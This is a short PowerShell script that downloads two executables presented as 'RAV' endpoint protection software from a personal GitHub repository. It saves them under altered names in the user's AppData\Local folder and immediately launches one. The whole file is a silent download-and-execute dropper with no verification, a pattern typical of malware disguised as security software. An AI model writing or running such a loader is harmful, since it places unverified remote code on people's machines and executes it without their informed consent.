$serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVService.exe"
$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVEndpointProtection.exe"
$servicePath = "$env:USERPROFILE\AppData\Local\RAVService.exe"
$popupPath = "$env:USERPROFILE\AppData\Local\RAVPopup.exe"

Invoke-WebRequest -Uri $serviceURL -OutFile $servicePath

Start-Sleep -Seconds 1

Invoke-WebRequest -Uri $popupURL -OutFile $popupPath

Start-Sleep -Seconds 1

Start-Process $servicePath
